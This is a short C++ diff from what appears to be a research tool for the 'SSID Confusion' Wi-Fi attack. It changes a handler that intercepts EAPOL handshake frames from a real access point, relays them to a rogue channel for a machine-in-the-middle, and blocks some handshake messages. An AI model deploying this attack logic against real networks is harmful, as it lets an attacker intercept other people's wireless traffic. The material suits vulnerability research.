@@ -19,18 +19,18 @@ void SsidConfusion::send_to_rogue(const vector<uint8_t> &raw) const {
 	sock_rogue->send(translated, netconfig.rogue_channel);
 }
 
-FrameProcess SsidConfusion::handle_eapol_real(const HWAddress<6> addr1,
-											  const HWAddress<6> addr2,
-											  PDU &pdu) const {
+FrameProcess SsidConfusion::handle_eapol_real(
+	const HWAddress<6> addr2, const PDU &pdu,
+	const vector<uint8_t> &raw) const {
 	// EAPOL AP -> STA on real channel
-	if(addr1 == sta.get(SK::mac) && addr2 == ap.get(SK::mac) && is_eapol(pdu)) {
-		int eapol_msg = get_eapol_msg_num(pdu);
-		log(LogLevel::INFO, "Real channel: EAPOL {} AP -> STA", eapol_msg);
-
-		if(eapol_msg == 1 || eapol_msg == 3) {
-			send_to_rogue(pdu);
-			return STOP;
-		}
+	if(addr2 == ap.get(SK::mac) && is_eapol(pdu)) {
+		//TODO check first M1as PMKSA cache hit -> force EAP restart
+		const int msg = get_eapol_msg_num(pdu);
+		if(msg == 2 || msg == 4) return STOP; //block cycles
+		if(msg != -1) return CONTINUE;
+		display_traffic(pdu, "Real channel", " AP -> STA  -- MitM'ing ");
+		send_to_rogue(raw);
+		return STOP;
 	}
 	return CONTINUE;
 }
